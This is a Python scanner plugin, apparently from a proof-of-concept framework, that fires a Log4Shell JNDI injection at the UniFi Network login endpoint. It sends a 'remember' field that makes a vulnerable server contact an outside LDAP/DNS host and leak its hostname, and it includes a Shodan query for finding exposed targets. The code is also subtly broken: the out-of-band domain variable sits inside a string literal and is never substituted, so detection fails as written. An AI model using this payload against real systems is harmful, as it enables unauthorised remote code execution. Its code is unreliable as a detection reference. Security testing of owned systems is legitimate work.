import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''UniFi Network Log4j JNDI RCE''',
        "description": '''A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in an impacted UniFi Network Application .''',
        "severity": "critical",
        "references": [
            "https://community.ui.com/releases/UniFi-Network-Application-6-5-55/48c64137-4a4a-41f7-b7e4-3bee505ae16e", 
            "https://twitter.com/sprocket_ed/status/1473301038832701441"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.title:"UniFi Network"'''
        },
        "tags": ["rce", "log4j", "ubnt", "unifi", "oast", "jndi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/api/login"""
        method = "POST"
        data = """{"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.oob_domain}","strict":true}"""
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url